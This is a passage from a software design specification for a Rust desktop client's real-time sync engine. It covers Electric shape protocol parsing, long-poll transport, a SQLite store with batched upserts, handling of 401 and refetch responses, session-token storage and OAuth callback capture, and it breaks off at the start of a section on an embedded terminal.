  { "headers": { "operation": "insert" }, "key": "\"issues\"/\"01J9…0L\"", "value": { … } },
  { "headers": { "operation": "update" }, "key": "\"issues\"/\"01J9…0L\"", "value": { … } },
  { "headers": { "operation": "delete" }, "key": "\"issues\"/\"01J9…0N\"", "value": { "id": "…" } },
  { "headers": { "control": "up-to-date" } }
]
```

Operations: `insert` and `update` are both **upserts** (treat identically — insert-or-update); `delete` removes by `key`, and `value` may be absent or partial (never rely on it — parse the id out of `key`). Control messages: `up-to-date` (no-op; persist handle/offset, reopen the loop) and `must-refetch` (§5.6).

**Rust wire types:**

```rust
pub enum ShapeMessage {
    Insert  { key: RowKey, value: serde_json::Map<String, Value> },
    Update  { key: RowKey, value: serde_json::Map<String, Value> },
    Delete  { key: RowKey },
    UpToDate,
    MustRefetch,
}

// Parsed from the "value" object with camelCase keys normalized to snake_case,
// leaving values as raw JSON (all strings, per §5.5). Insert and Update collapse
// to the same store operation; we keep the variant only for logging parity.
pub fn parse_messages(body: &[u8]) -> Vec<ShapeMessage> { … }
```

**Key parsing.** The `key` is a schema-qualified, slash-separated, double-quoted string. Examples from the fixtures and the DB:

- `"issues"/"01J9K0A0X3CB4E5F6G7H8J9K0L"` → table `issues`, pk `01J9…0L`.
- Sometimes the first segment is schema-qualified (`"public"."issues"/"…"`); the first segment is metadata we don't need — we already know the table from the request.
- `issue_labels` is composite: `"issue_labels"/"<issue_id>"/"<label_id>"` → the pk is the pair.

Parse by splitting on `/`, stripping surrounding double-quotes from each segment, and taking the trailing 1 (normal) or 2 (`issue_labels`) segments as the primary key:

```rust
pub enum RowKey { Single(String), Pair(String, String) }

fn parse_key(raw: &str, composite: bool) -> RowKey {
    let segs: Vec<&str> = raw.split('/').map(|s| s.trim_matches('"')).collect();
    if composite {
        let n = segs.len();
        RowKey::Pair(segs[n - 2].to_string(), segs[n - 1].to_string())
    } else {
        RowKey::Single(segs.last().unwrap().to_string())
    }
}
```

**camelCase → snake_case normalization at parse time.** Electric usually delivers Postgres column names verbatim (`project_id`, `created_at`), but some server-side rewrite paths yield camelCase (`projectId`, `createdAt`) — both forms appear in the wild and the `camel-case.json` / `snake-case.json` fixtures assert they decode identically. Normalize every key of the `value` object from camel to snake at parse time (a tiny hand-rolled `camel_to_snake(&str) -> String` — do NOT pull in `heck` just for this; it must match the Swift/Zig behaviour exactly, including all-lowercase keys passing through untouched). After normalization the store only ever sees snake_case column names, so the generic upsert (§5.4) binds them directly.

**`protocol.rs` unit tests (`tests/protocol.rs`) — the Phase-2 gate.** Load the real fixtures from `packages/electric-protocol/fixtures/` (path them relative to `CARGO_MANIFEST_DIR` up to the repo root) and assert 1:1 with the Swift/Zig assertions:

1. `initial-snapshot.json` body → exactly 2 inserts + 1 `UpToDate`, keys parse to the two ULIDs, `value` has `project_id`/`created_at` in snake_case.
2. `live-update.json` body → 1 update + 1 delete + 1 `UpToDate`; the delete key parses to `01J9…0N`.
3. `must-refetch.json` body → exactly 1 `MustRefetch`, nothing else.
4. `up-to-date.json` body → exactly 1 `UpToDate`.
5. `camel-case.json` and `snake-case.json` values → **byte-identical** normalized maps (parse both, assert `==`). **Note:** both fixtures carry `due_time`, `end_time`, and a nested `description` object — **stale pre-GFM fields that do not exist in the desktop `issues` schema.** The parser models them as ordinary keys; the *store* must tolerate-and-drop them via the known-column allowlist (§5.4), never crash on them. Do not add these columns to the schema to "fix" the fixture.
6. Empty body (`[]` or zero bytes) → 0 messages (no panic).

These vectors are the cross-platform contract; if a fixture changes, all four clients change together. Do not add Rust-only fixtures — extend `packages/electric-protocol/` if the protocol genuinely grows.

### 5.3 HTTP transport (`client.rs`) — blocking ureq, one thread per shape

**Crate choice: `ureq` (pure-Rust, `rustls` TLS, blocking).** No async runtime. This matches the proven Swift-`Task`/Zig-`std.Thread` model and avoids running a tokio reactor *underneath* gpui's own executor. (The only tokio in the whole desktop workspace lives in the `steer` crate for `tokio-tungstenite` — §8 — and it runs on its own runtime, isolated from sync.)

- `ureq::AgentBuilder` with `.timeout_read(Duration::from_secs(90))`. **This 90s must exceed the server's ~60s long-poll window.** If the read timeout is *below* the hold window, every live request times out client-side and the loop degrades into a <1s hammering short-poll — "real-time sync" still technically works but blasts the backend. The `long-poll-canary.md` fixture exists precisely to catch this; the Phase-2 gate re-runs it (see §5.9).
- **Do NOT install any caching middleware.** `ureq` has no shared HTTP cache by default, which is exactly what we want (EXP-1 #13 sub-point a). Never set `If-None-Match` / `If-Modified-Since` from a stored ETag; never key a cache by URL. The proxy already sends `cache-control: private, no-store` + `vary: authorization, cookie, x-api-key`; our job is simply to never add a layer that would ignore it. (This bit macOS `URLCache`, which cached a cross-auth empty snapshot under the bare shape URL.)
- **One `std::thread` per shape per account** — 14 threads per signed-in account. Each runs the blocking long-poll loop. This is cheap (a blocked socket read costs a stack, not CPU) and mirrors iOS's 14 `Task`s / Zig's 14 threads. The `SyncManager` (§5.8) owns them.
- **Cooperative cancellation within ~100ms.** Each thread holds an `Arc<AtomicBool>` stop flag. Because a `ureq` read can block for up to 90s, we cannot rely on checking the flag only between polls. Two-part rule: (1) check the flag before issuing each request; (2) hand `ureq` a request whose underlying socket can be shut down — the pragmatic decision is to check the flag at every loop boundary and additionally keep the poll bodies short during initial snapshot; for the live hold, sign-out/quit sets the flag and calls `agent`-level connection close so the in-flight read returns promptly. **Open question:** ureq 2.x does not expose a first-class per-request abort handle; if sub-100ms teardown of an *in-flight* 90s read proves impossible with ureq, fall back to a `reqwest::blocking` client (also rustls, also no shared cache) which lets us drop the response body to abort, or spawn the socket with an explicit `TcpStream` we can `shutdown()`. Decide during Phase 2; the canary + a "quit exits in <500ms" manual check are the acceptance bar.

**The poll loop** (direct port of `ShapeClient.pollOnce`, returning a `pending_refetch` bool):

```rust
fn run(&self, stop: Arc<AtomicBool>) {
    let mut backoff = Duration::from_millis(500);
    let mut pending_refetch = false;
    while !stop.load(Ordering::Relaxed) {
        let (base, token) = match (self.base_url(), self.token()) {
            (Some(b), Some(t)) => (b, t),
            _ => { thread::sleep(Duration::from_secs(2)); continue; } // signed out / no base yet
        };
        match self.poll_once(&base, &token, pending_refetch) {
            Ok(next_pending) => {
                pending_refetch = next_pending;
                backoff = Duration::from_millis(500); // reset on success
                if pending_refetch { thread::sleep(Duration::from_millis(500)); }
            }
            Err(ShapeError::Unauthorized) => {
                self.emit(ShapeDelta::Unauthorized(self.account_id.clone()));
                return; // §5.6(b): stop this pipeline; SyncManager routes to login
            }
            Err(e) => {
                tracing::warn!(shape=%self.name, "{e}");
                thread::sleep(backoff);
                backoff = (backoff * 2).min(Duration::from_secs(30)); // cap 30s
            }
        }
    }
}
```

Backoff policy matches the contract: 500ms base, exponential, cap 30s, reset on the first success. Back off only on *transport/5xx* errors — never on `up-to-date` (that's the normal steady state).

### 5.4 Local store (`store.rs`) — rusqlite/WAL, generic upsert, one txn per batch

**Crate: `rusqlite` with features `["bundled", "serde_json"]`** (`bundled` statically links SQLite so there is no system-lib dependency in the AppImage/.app; `serde_json` gives us `Value` binding). **Open question / alternative:** `sqlx` was considered but rejected for the sync core — it's async-first and pulls a runtime; `rusqlite` blocking fits the one-thread-per-shape model and the proven GRDB/Zig-sqlite designs.

**Per-account database.** One SQLite file per signed-in account: `{data_dir}/accounts/{account_id}/sync.sqlite` (`data_dir` from the `directories` crate — `~/Library/Application Support/at.exponential/` on macOS, `$XDG_DATA_HOME/exponential/` on Linux). Multi-account is first-class (like iOS): signing out one account cancels its 14 threads and leaves its DB on disk for offline resume; it never touches another account's DB.

**Connections.** Open with `PRAGMA journal_mode=WAL; PRAGMA foreign_keys=ON; PRAGMA busy_timeout=5000;`. WAL lets a **single writer** and multiple readers coexist:

- **One writer `Connection` behind `Arc<Mutex<Connection>>`.** The lock is held only for the ~milliseconds it takes to apply one batch — the HTTP long-poll happens entirely *outside* the lock. This is the fix for the iOS write-starvation bug: with 14 threads each doing per-row writes inside a live loop, the writer never drained. Here each thread does exactly one `BEGIN IMMEDIATE … COMMIT` per poll response.
- **A separate read-only WAL `Connection`** (or a tiny read pool) serves UI hydration queries (§5.5) without ever blocking on the writer.

**Schema.** `electric_offsets` for the cursor, plus one snake_case table per shape mirroring `packages/db-schema`:

```sql
CREATE TABLE IF NOT EXISTS electric_offsets (
  shape   TEXT PRIMARY KEY,
  handle  TEXT NOT NULL,
  "offset" TEXT NOT NULL           -- "offset" is a SQLite keyword: always quote it
);

-- Every shape except issue_labels: TEXT id PK, all other columns TEXT (see §5.5).
CREATE TABLE IF NOT EXISTS issues (
  id TEXT PRIMARY KEY,
  project_id TEXT, number TEXT, identifier TEXT, title TEXT, description TEXT,
  status TEXT, priority TEXT, assignee_id TEXT, creator_id TEXT,
  due_date TEXT, sort_order TEXT, completed_at TEXT, archived_at TEXT,
  duplicate_of_id TEXT, recurrence_interval TEXT, recurrence_unit TEXT,
  pr_url TEXT, pr_number TEXT, pr_state TEXT, branch TEXT, pr_merged_at TEXT,
  created_at TEXT, updated_at TEXT
);

-- issue_labels is the ONLY composite-PK, id-less table:
CREATE TABLE IF NOT EXISTS issue_labels (
  issue_id TEXT NOT NULL, label_id TEXT NOT NULL,
  workspace_id TEXT, created_at TEXT,
  PRIMARY KEY (issue_id, label_id)
);

-- issue_subscribers MUST NOT declare an `email` column (never synced; privacy bug otherwise).
CREATE TABLE IF NOT EXISTS issue_subscribers (
  id TEXT PRIMARY KEY, issue_id TEXT, user_id TEXT, workspace_id TEXT,
  source TEXT, unsubscribed TEXT, created_at TEXT, updated_at TEXT
);
```

Do NOT declare `FOREIGN KEY` constraints between shape tables even with `foreign_keys=ON` — Electric delivers rows per-shape in independent streams, so a child can arrive before its parent; cross-table FKs would reject legitimate inserts. `foreign_keys=ON` is for correctness of any *within-row* self-references we choose to model (we don't). Referential integrity is a query-time concern, handled by the in-memory collections (§5.5), not a store constraint.

**Generic apply (Zig-style, table-agnostic).** One function applies a whole batch inside one transaction. It is column-generic: it reads the incoming snake_case keys and builds the `ON CONFLICT` upsert dynamically, so partial updates (a message whose `value` carries only a subset of columns) update exactly the present columns and leave the rest intact:

```rust
pub fn apply_batch(&self, table: &ShapeSpec, msgs: &[ShapeMessage],
                   handle: Option<&str>, offset: Option<&str>) -> Result<()> {
    let mut conn = self.writer.lock();          // held ~ms; HTTP already done
    let tx = conn.transaction_with_behavior(TransactionBehavior::Immediate)?;
    for m in msgs {
        match m {
            ShapeMessage::MustRefetch => {                    // §5.6(c) synthetic head
                tx.execute(&format!("DELETE FROM {}", table.sql), [])?;
            }
            ShapeMessage::Insert { key, value } | ShapeMessage::Update { key, value } => {
                upsert_row(&tx, table, key, value)?;          // dynamic INSERT … ON CONFLICT(pk) DO UPDATE
            }
            ShapeMessage::Delete { key } => {
                delete_by_key(&tx, table, key)?;              // DELETE … WHERE pk = ? (or issue_id=? AND label_id=?)
            }
            ShapeMessage::UpToDate => { /* no row effect */ }
        }
    }
    if let (Some(h), Some(o)) = (handle, offset) {
        tx.execute(
            r#"INSERT INTO electric_offsets(shape,handle,"offset") VALUES (?1,?2,?3)
               ON CONFLICT(shape) DO UPDATE SET handle=?2, "offset"=?3"#,
            params![table.name, h, o],
        )?;
    }
    tx.commit()?;    // ONE commit per batch — never per row
    Ok(())
}
```

`upsert_row` binds every present column as a `?` param and generates `INSERT INTO t (cols…) VALUES (?…) ON CONFLICT(<pk>) DO UPDATE SET col=excluded.col, …` for the non-pk columns present. The pk clause is `(id)` for normal tables and `(issue_id, label_id)` for `issue_labels`. **One transaction per batch, never per row** — this is the single most important store rule (per-row writes were the iOS write-starvation bug).

**CRITICAL — bind the scalar, do NOT route `serde_json::Value` through its blanket `rusqlite::ToSql` impl.** The `serde_json` rusqlite feature's `ToSql for Value` runs `serde_json::to_string` over the whole `Value`, so `Value::String("First issue")` would be stored as the TEXT `"First issue"` **with surrounding double-quotes**, `Value::Null` as the literal TEXT `null` (not SQL `NULL`), and objects/arrays JSON-stringified — silently corrupting every text and nullable column on hydrate. Instead, `upsert_row` **matches the `Value` variant and binds the underlying scalar** (mirroring iOS `coerceStringValues` / the Zig generic upsert — extract the scalar, never JSON-re-encode):

```rust
fn bind_value(v: &serde_json::Value) -> Box<dyn rusqlite::ToSql> {
    use serde_json::Value::*;
    match v {
        String(s) => Box::new(s.clone()),                       // bind the text, NO quotes
        Number(n) => Box::new(n.to_string()),                    // keep TEXT so §5.5 DisplayFromStr hydrates
        Bool(b)   => Box::new(if *b { "t" } else { "f" }.to_string()), // canonical text your bool deser accepts
        Null      => Box::new(rusqlite::types::Null),            // real SQL NULL
        other     => Box::new(serde_json::to_string(other).unwrap()), // Array/Object → JSON text
    }
}
```

Add a round-trip unit test: apply an insert carrying a string + a null + a number, `SELECT` it back, and assert the title has **no** quotes and the null column **is** SQL `NULL` (not the string `"null"`).

**CRITICAL — filter incoming keys to a known-column allowlist before building SQL.** `upsert_row` must **not** blindly build `INSERT (cols…)` from whatever snake_case keys the wire delivered. Each `ShapeSpec` (§5.9) carries the exact column set from its `CREATE TABLE`; `upsert_row` filters the normalized incoming keys to that allowlist and **silently drops unknowns** before generating SQL. Two concrete reasons: (1) the conformance fixtures themselves carry columns that do **not** exist in the `issues` table — `snake-case.json`/`camel-case.json` include `due_time`, `end_time`, and a nested `description` object (stale pre-GFM fields) — so an unfiltered apply generates `INSERT … due_time …` → SQLite `no such column: due_time` → the **whole batch rolls back → the cursor never advances → that shape wedges in a permanent rollback/retry loop** (a fresh flavor of EXP-1 #13); (2) forward-compat — the moment the server adds a column before the desktop schema catches up, an unfiltered client stalls that shape for every old build. Drop-and-ignore is the correct posture, not crash.

Add an **apply-level** fixture test (not just the parse-level tests of §5.2): feed `snake-case.json`/`camel-case.json` through `apply_batch` and assert the row lands with **no error** (the extra `due_time`/`end_time`/`description` keys are tolerated-and-dropped).

The offset/handle is persisted **in the same transaction** as the rows it describes. If the batch rolls back, the cursor doesn't advance and the next poll re-requests the same offset — at-least-once delivery with idempotent upserts, exactly like iOS/Zig.

### 5.5 Values are strings; hydrate coerces to native (`domain` serde)

Electric delivers **heterogeneous JSON scalars** — strings, but also bare numbers (`initial-snapshot.json` sends `"number": 1`; the snake/camel fixtures send `"sort_order": 1.0`), booleans, JSON `null`, and the occasional nested JSON object (`"description": {…}` in the stale fixtures). The old "all values are strings" claim is false and load-bearing to get right. We **pin ONE canonical storage form — TEXT** — by normalizing at **bind time** (finding-#22's variant match already turns a bare `1`/`1.0`/`true` into its text form before it hits SQLite), so the store columns are almost all `TEXT` and every scalar lands as text. Coercion to native Rust types (`i64`, `f64`, `bool`, `chrono::NaiveDate`, enums) happens only at **hydrate** time, when we read a row out of SQLite into a typed `domain` struct. This mirrors iOS (`coerceStringValues`) and Zig and keeps the apply path robust to schema drift and partial updates.

Because everything is stored as text, hydration can uniformly use `serde_with`'s `DisplayFromStr` for the numeric columns. **Do NOT use `BoolFromInt`** — it expects `0`/`1`, but a Postgres/Electric boolean can surface as `true`/`false` or `"t"`/`"f"`; use a **string-tolerant bool deserializer** that accepts `"t"`/`"f"`/`"true"`/`"false"`/`0`/`1`/`true`/`false` (a tiny custom `deserialize_with`). Add a hydrate test over the snake/camel fixtures asserting the numeric + bool columns coerce correctly.

```rust
use serde_with::{serde_as, DisplayFromStr};   // NOT BoolFromInt — use a tolerant bool deserializer

#[serde_as]
#[derive(Deserialize)]
pub struct Issue {
    pub id: String,
    pub project_id: String,
    #[serde_as(as = "DisplayFromStr")] pub number: i64,       // "1" | 1 → 1
    pub identifier: String,
    pub title: String,
    pub status: IssueStatus,                                   // enum from domain-contract
    pub priority: IssuePriority,
    pub assignee_id: Option<String>,
    #[serde_as(as = "Option<DisplayFromStr>")] pub sort_order: Option<f64>,
    pub due_date: Option<String>,                              // "2026-05-20"; parse to NaiveDate at UI edge if needed
    pub completed_at: Option<String>,
    pub created_at: String,
    pub updated_at: String,
}
```

Enums (`IssueStatus`, `IssuePriority`, `NotificationType`, `WorkspaceMemberRole`, `PublicWritePolicy`, `RecurrenceUnit`, `PrState`, `CodingSessionStatus`, `IssueEventType`, `SubscriberSource`) come from `crates/domain/src/contract.generated.rs` (emitted by the Rust `@exp/domain-contract` generator — see §2 of this doc). They deserialize from their canonical string values and, per §4, also carry icon/color option tables for the UI. An unknown enum value must deserialize to a tolerant fallback (e.g. `#[serde(other)]` variant) rather than dropping the row — forward-compat with a server that adds an enum value before the desktop updates.

Rows land in SQLite as strings; the read-only connection `SELECT`s them and `serde_json`/`serde_rusqlite` reconstructs a JSON object which the tolerant struct deserializes. Hydration is where a bad value is caught and logged, never at apply.

### 5.6 The EXP-1 #13 gotchas — non-negotiable, tested day one

EXP-1 #13 was the "all issues suddenly vanished + projects show empty" bug. The root causes were fixed server-side (the proxy hardening quoted in §5.2), but the *client-side* half of the fix was dropped when the native apps were archived. The new Rust engine must re-implement it from day one. Four rules:

**(a) No URL-keyed HTTP cache.** Honour `cache-control: private, no-store`. In Rust this is a *don't* rule: use `ureq`/`reqwest` with their default no-shared-cache behaviour, never add a caching layer, never send `If-None-Match`/`If-Modified-Since` from a stored ETag. The desktop must never serve a stale shape body out of any cache keyed only by the request URL.

**(b) 401 → hard Unauthorized, never anonymous-degrade.** A shape request that presented a bearer token which fails to resolve gets an explicit `401` from the proxy (`hasTokenCredentials(request) && !session`). The client must treat 401 as terminal for that account's pipeline: clear the stored token (§5.7), emit `ShapeDelta::Unauthorized(account_id)`, stop the 14 threads, and route the UI to the login screen. It must **NOT** retry anonymously, and it must NOT keep polling with the dead token. Better Auth has no refresh token; the only recovery is re-login (an active session is kept alive precisely *by* the polling, so a live app won't spuriously 401). This is the difference between "session expired → login screen" and "session expired → silently empty board".

**(c) 409 or inline `must-refetch` → atomic refetch, stale rows kept until replaced.** Electric signals a shape-handle rotation two ways: an HTTP `409` status, or an inline `{"headers":{"control":"must-refetch"}}` in an otherwise-200 body. Both mean "your handle/offset is invalid; re-snapshot from `offset=-1`." The trap is doing `DELETE FROM table` immediately — that flashes an empty board for the reader between the delete and the re-fetch (the visible EXP-1 #13 symptom). The correct dance (direct port of `ShapeClient.pollOnce`):

1. On 409, or on stripping an inline `must-refetch`: **delete only the `electric_offsets` row** for this shape (reset the cursor to force `offset=-1` next time). **Do NOT delete table rows yet** — leave the stale rows visible. Set `pending_refetch = true`. If the inline case carried other messages alongside the `must-refetch`, apply those too, then return `pending_refetch = true`.
2. The next poll goes out as an initial snapshot (`offset=-1`), producing the fresh full row set. Because `pending_refetch` is true, **prepend a synthetic `MustRefetch` message** to the head of the decoded batch. `apply_batch` then runs `DELETE FROM table` followed by all the fresh `INSERT`s **inside one transaction** — a reader never observes an empty table; it sees the old rows, then atomically the new rows.
3. Adopt the fresh `electric-handle`/`electric-offset` from the snapshot response (persisted in that same transaction).

This is why `MustRefetch` is a message variant that `apply_batch` handles as `DELETE FROM {table}` (§5.4) rather than a special control-flow flag — it lets the delete and the re-inserts share one commit.

**(d) Sorted where inherited for free.** Because the client never sends `where` (§5.2), it can never flip an id-list order and rotate a handle into a 409 loop. There is nothing to implement here beyond the discipline of *not* adding client-side `where`/`columns` params. Ever.

### 5.7 Auth (`api` crate) — session bearer everywhere, file-based token store, OAuth via system browser

Auth lives in the `api` crate (`crates/api/src/login.rs`, `token_store.rs`, `opener.rs`) because it's shared by both sync and the tRPC mutation client. The sync `client.rs` reads the token through a `token_provider: Arc<dyn Fn() -> Option<String> + Send + Sync>` closure evaluated **at call time** (not captured once) so a re-login updates every in-flight loop's next request.

**Two distinct credentials — do not confuse them:**

- **Better Auth session token** — the `Authorization: Bearer <token>` on **every** shape request and **every** tRPC request. This is the mobile auth path (`resolveSession` accepts it). This is the *only* credential sync/tRPC ever uses.
- **`expu_` personal API key** — auto-minted, hidden (EXP-2a), used **only** inside the coding launcher's `.mcp.json` so `claude` can call the web `/api/mcp`. It is NEVER a sync or tRPC auth credential. It is minted/stored by the `coding`/`api` glue (§7 of this doc), not here. Keep the two in separate token-store entries.

**Login flow** (login view owned by the `ui` crate; the mechanics here):

1. `GET /api/auth-config` first — returns which methods are enabled (`AUTH_PASSWORD_ENABLED`, `GOOGLE_LOGIN_ENABLED`, OIDC providers). Gate the UI on this.
2. **Login-view order parity (EXP-5):** the **cloud/instance-URL button comes FIRST**, then password fields, then the Google/OIDC buttons per auth-config — mirroring the web and (fixed) macOS order. The Linux native login was missing the leading cloud button; the new desktop must not repeat that.
3. **Password:** `POST /api/auth/sign-in/email` with `{email, password}` → `{token, user}` (also sets a `Set-Cookie` we ignore in favour of the token; the token is the portable credential). Store the token (below).
4. **OAuth (Google/OIDC):** open the system browser at `GET /api/mobile-oauth-start?provider=google`. The server runs the OAuth dance and redirects to `/api/mobile-oauth-return`, which deep-links back as `exp://oauth-return#token=<session-token>`.

**Callback capture — two mechanisms:**

- **PRIMARY: custom scheme `exp://`.** Register `exp` as a URL scheme — macOS via `CFBundleURLTypes` in the bundled `Info.plist`; Linux via an installed `.desktop` file with `MimeType=x-scheme-handler/exp;` (both templates live in `apps/desktop/assets/`, §3). The OS hands the app the callback URL; **the token is in the URL *fragment*** (`#token=…`), which the app parses locally. gpui exposes app-reactivation/open-url on macOS via the `App`; on Linux a single-instance guard (e.g. a lock socket) forwards the URL from a second launch to the running instance.
- **FALLBACK: 127.0.0.1 loopback.** For environments where custom-scheme registration didn't take, spin an ephemeral `127.0.0.1:<port>` listener and pass `redirect=http://127.0.0.1:<port>/cb` to the return route. **This needs a NEW server-side `redirect=` param on `/api/mobile-oauth-return`** that 302-redirects the token as a **`?token=` query** (not a fragment — fragments are never sent to servers, so the loopback listener would never see a `#token`). Constraints on that server change: the `redirect` target must be `127.0.0.1`/`localhost`-bound only, the token single-use and short-lived. (This is the one small server addition sync/auth requires; call it out in §2/§7 of this doc as a coordinated change.)

**Token storage: the file-based store** — `{data_dir}/accounts/{id}/token`, `0600` file / `0700` dir, perms set before content is written (same posture as the old macOS debug file-store). **Locked decision (2026-07-03): always file-based, never the OS keyring** — the keyring crate's macOS backend re-prompts on every rebuild of an unsigned dev binary, and Secret Service is absent on headless Linux. Store per-account. On 401 (§5.6b) delete the session-token entry for that account.

**Browser-open robustness (EXP-5).** OAuth and "open in browser" go through `crates/api/src/opener.rs` built on the **`opener` crate**, but with an explicit Linux fallback chain because a misconfigured `xdg-open` (EXP-5: opened a *text editor* on fresh Ubuntu, hard-blocking login) must never block auth. Try in order: `$BROWSER` → `xdg-open` → `gio open` → `x-www-browser` → `sensible-browser` → `firefox` → `google-chrome`/`chromium`. If **all** fail, surface the URL in a **copyable dialog** ("Open this in your browser to sign in") — a broken opener degrades to copy-paste, never to a dead end.

### 5.8 Reactivity (`collections.rs`) — the only gpui seam

Hydrate typed in-memory collections from SQLite at startup, then keep them live off the shape threads. The design (mirrors §3's threading model):

- **One `gpui::Entity<Collection<T>>` per shape** (14 entities), each a `Global` on the `App` or held by a top-level `Store` model. Separate entities give **fine-grained `cx.notify()`** — an issue update wakes only the issue-list views, not the label chips.
- `Collection<T>` is an in-memory `HashMap<Pk, T>` (or `Vec<T>` + index) of hydrated `domain` structs, plus a monotonic revision counter for cheap diffing.
- The shape threads (§5.3) never touch gpui. They emit `ShapeDelta { account_id, shape, applied_keys }` (or the decoded rows) over a `flume::Sender<ShapeDelta>` after each batch commits to SQLite.
- **One foreground `cx.spawn` task** owns the `flume::Receiver`, drains deltas, re-hydrates the touched rows from the read-only SQLite connection into the matching collection Entity via `entity.update(cx, …)`, and calls `cx.notify()`. Because SQLite is already the source of truth (the write happened on the shape thread), the foreground task does cheap point-reads, not re-parsing the wire.
- **Views** `cx.observe(&collection_entity)` (or observe the `Store` global) and re-render on notify. Derived queries — filtered/sorted issue lists, "issues in project X", the notifications inbox count, the "coding now" badge from `coding_sessions` — are **plain Rust closures over the in-memory collections** (port `apps/web/src/lib/filters.ts` `matchesFilters` verbatim into `domain`/`ui`), not SQL. This replaces the web's `useLiveQuery` and iOS's GRDB `ValueObservation`; the collections are small enough (one workspace's working set) to filter in-memory on every render.

This keeps Entities `!Send` and main-thread-only (gpui's requirement) while all blocking I/O stays on background threads — the marshaling point is the single flume drain.

### 5.9 The 14 shapes (`shapes.rs`)

The `ShapeSpec` table is the registry the `SyncManager` iterates. Each entry: display name, URL path (`/api/shapes/{name}`), SQLite table, and PK kind. The server-side `where`/`requireAuth`/`columns` are shown for reference only — the client sends none of them; they document what the proxy enforces so Fable understands the scoping.

| # | shape name | path | server-side where (proxy-enforced) | PK kind |
|---|---|---|---|---|
| 1 | `workspaces` | `/api/shapes/workspaces` | `id IN (readable workspace ids)` | `id` |
| 2 | `projects` | `/api/shapes/projects` | `workspace_id IN (readable)` | `id` |
| 3 | `issues` | `/api/shapes/issues` | `project_id IN (readable projects)` | `id` |
| 4 | `labels` | `/api/shapes/labels` | `workspace_id IN (readable)` | `id` |
| 5 | `issue_labels` | `/api/shapes/issue-labels` | `workspace_id IN (readable)` | **composite `(issue_id, label_id)`** |
| 6 | `users` | `/api/shapes/users` | `id IN (co-member ids)` — tighter, full rows incl. email | `id` |
| 7 | `workspace_members` | `/api/shapes/workspace-members` | `workspace_id IN (readable)` | `id` |
| 8 | `workspace_invites` | `/api/shapes/workspace-invites` | **requireAuth**; `workspace_id IN (readable)` | `id` |
| 9 | `comments` | `/api/shapes/comments` | `workspace_id IN (readable)` | `id` |
| 10 | `attachments` | `/api/shapes/attachments` | `workspace_id IN (readable)` | `id` |
| 11 | `notifications` | `/api/shapes/notifications` | **requireAuth**; `user_id = me` | `id` |
| 12 | `issue_events` | `/api/shapes/issue-events` | `workspace_id IN (readable)` | `id` |
| 13 | `issue_subscribers` | `/api/shapes/issue-subscribers` | `workspace_id IN (readable)`; **columns allowlist EXCLUDES `email`** | `id` |
| 14 | `coding_sessions` | `/api/shapes/coding-sessions` | `workspace_id IN (readable)` | `id` |

Notes for Fable:

- **Path casing:** the URL path segments are **kebab-case** (`issue-labels`, `workspace-members`, `workspace-invites`, `issue-events`, `issue-subscribers`, `coding-sessions`) even though the tables are snake_case. The `ShapeSpec` carries both.
- **`requireAuth` shapes (`workspace_invites`, `notifications`) must never be polled without a token** — an anonymous request gets a hard 401, which would (correctly, per §5.6b) tear down the pipeline. The `SyncManager` only starts *any* shape thread for an account once that account holds a resolved token, so this is naturally satisfied; do not special-case them into an anon path.
- **`users` is PII-tight** (co-member ids, not workspace-readable) and syncs full rows including `email` — that's fine, it's the signed-in user's co-members. `issue_subscribers` is the opposite: workspace-readable but `email`-excluded. The store schema difference (§5.4: no `email` column on `issue_subscribers`) is the client-side belt to the server's suspenders.
- `repositories`, `project_repositories`, `user_notification_prefs`, `email_deliveries`, and the widget tables are **server-only** (tRPC) — not in this table, never synced. The coding launcher (§7) reads repositories via tRPC, not sync.

### 5.10 SyncManager (`manager.rs`) — per-account reconcile

A single `SyncManager` (a gpui global model, but its background bookkeeping is gpui-free) reconciles the set of running pipelines against the set of signed-in accounts (direct port of `SyncManager.reconcile`):

- Holds `pipelines: HashMap<AccountId, Vec<JoinHandle + Arc<AtomicBool>>>`.
- On a signed-in-accounts change (login, logout, token refresh): for each account with a valid token not yet running, spawn its 14 shape threads against its per-account SQLite; for each running account no longer signed in (or 401'd), set every stop flag and join.
- `sign_out(account_id)`: flip the account's stop flags, join within ~100ms, leave the DB on disk (offline resume). Full deletion is a separate explicit "Delete local data" action.
- Exposes a `wait_for_first_sync()` (port of iOS's "wait up to ~5s for the workspaces shape to land") so the app shell can show a spinner until the first board is renderable rather than an empty state.

### 5.11 Phase-2 gate (the acceptance bar for this section)

The `sync` + auth work is done when:

1. **`cargo test -p sync` passes ALL `packages/electric-protocol/fixtures/*.json`** with the six assertions in §5.2 (initial-snapshot → 2 inserts + up-to-date; live-update → update + delete + up-to-date; must-refetch → lone control; up-to-date → lone control; snake + camel decode byte-identically; empty body → 0 messages).
2. **Live sync of all 14 shapes renders a real board** against a running backend (the workspaces → projects → issues chain hydrates and the issue list paints).
3. **Quit + restart resumes from the persisted cursor** — no `offset=-1` re-snapshot on a warm start (verify by log: the first live request carries the stored `handle`/`offset`).
4. **A forced 409 does an atomic refetch with NO empty-table flicker** — rotate the shape handle server-side (or inject a `must-refetch`) and confirm the UI never shows an empty list between the old and new row sets (§5.6c).
5. **A dead token lands on the login screen, not an empty board** — revoke the session and confirm the pipeline 401s, tears down, and routes to login (§5.6b).
6. **The long-poll holds ~60s (canary), not <1s hammering** — run the `long-poll-canary.md` procedure (`time curl … live=true` ≈ 40–60s) *and* confirm the Rust client's live loop issues roughly one request per ~60s under no changes, not a tight spin (a log-rate assertion guards against a `.timeout_read` set below the server window).

Cross-references: the auth credentials feed the tRPC mutation client and the coding launcher's `.mcp.json` (§7 owns the `expu_` minting and MCP wiring); the in-memory collections are the read model every `ui` screen consumes (§4 owns the views); the login *view* layout parity is §4/EXP-5, this section owns its *mechanics*. The sync engine writes nothing to the server — all mutations go through tRPC with the same session bearer, gated by `awaitTxId` (§7), so an optimistic UI can wait for the Electric echo before clearing its pending state.


---

## 6. Embedded terminal (alacritty_terminal + PTY tee) — GPL-clean reimplementation

The `terminal` crate is the structural heart of the desktop app and the thing that separates it from every prior surface. It runs `claude`, JetBrains-style run commands, and plain shells inside a GPU-painted grid, and — critically — it is the **tap point** for the remote steer feature: a single blocking read loop fans the child's raw output out to both the on-screen emulator and the steer publisher (§08). This section specifies the crate end to end: the dependency choices and their licensing rationale, the PTY ownership model, the software tee, input/paste/remote-input plumbing, terminal-event reply forwarding, resize/SIGWINCH, the gpui grid `Element`, the reimplemented key/mouse/color tables, the JetBrains multi-tab manager, and the `claude` spawn path with its PATH-augmentation fix.

Two hard boundaries frame everything below:

